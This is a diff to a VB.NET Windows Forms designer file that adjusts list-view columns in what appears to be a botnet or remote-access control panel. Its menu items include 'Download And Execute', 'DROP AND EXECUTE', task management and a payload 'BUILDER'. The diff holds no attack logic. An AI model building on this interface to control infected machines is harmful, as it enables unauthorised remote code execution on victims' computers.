@@ -31,7 +31,6 @@ Partial Class Form1
         Me._Username = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
         Me._OS = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
         Me._VER = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
-        Me._TASKS = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
         Me.ClientMenu = New System.Windows.Forms.ContextMenuStrip(Me.components)
         Me.DownloadAndExecuteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.DROPANDEXECUTEToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
@@ -53,6 +52,7 @@ Partial Class Form1
         Me.TabPage1 = New System.Windows.Forms.TabPage()
         Me.TabPage3 = New System.Windows.Forms.TabPage()
         Me.LV2 = New System.Windows.Forms.ListView()
+        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
         Me.TabPage2 = New System.Windows.Forms.TabPage()
         Me.LV3 = New System.Windows.Forms.ListView()
         Me._NUM = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
@@ -61,7 +61,6 @@ Partial Class Form1
         Me.TaskMenu = New System.Windows.Forms.ContextMenuStrip(Me.components)
         Me.AddTaskToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.RemoveTaskToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
-        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
         Me.ClientMenu.SuspendLayout()
         Me.StatusStrip1.SuspendLayout()
         Me.TabControl1.SuspendLayout()
@@ -74,7 +73,7 @@ Partial Class Form1
         'LV1
         '
         Me.LV1.BorderStyle = System.Windows.Forms.BorderStyle.None
-        Me.LV1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me._IP, Me._COUNTRY, Me._ID, Me._Username, Me._OS, Me._VER, Me._TASKS})
+        Me.LV1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me._IP, Me._COUNTRY, Me._ID, Me._Username, Me._OS, Me._VER})
         Me.LV1.ContextMenuStrip = Me.ClientMenu
         Me.LV1.Dock = System.Windows.Forms.DockStyle.Fill
         Me.LV1.Font = New System.Drawing.Font("Verdana", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
@@ -90,7 +89,7 @@ Partial Class Form1
         '_IP
         '
         Me._IP.Text = "IP"
-        Me._IP.Width = 150
+        Me._IP.Width = 200
         '
         '_COUNTRY
         '
@@ -116,11 +115,6 @@ Partial Class Form1
         '
         Me._VER.Text = "Version"
         Me._VER.Width = 150
-        '
-        '_TASKS
-        '
-        Me._TASKS.Text = "Last Task"
-        Me._TASKS.Width = 100
         '
         'ClientMenu
         '
@@ -405,7 +399,6 @@ Partial Class Form1
     Friend WithEvents TaskMenu As ContextMenuStrip
     Friend WithEvents AddTaskToolStripMenuItem As ToolStripMenuItem
     Friend WithEvents RemoveTaskToolStripMenuItem As ToolStripMenuItem
-    Friend WithEvents _TASKS As ColumnHeader
     Friend WithEvents BUILDERToolStripMenuItem As ToolStripMenuItem
     Friend WithEvents ToolStripSeparator2 As ToolStripSeparator
     Friend WithEvents TabPage3 As TabPage
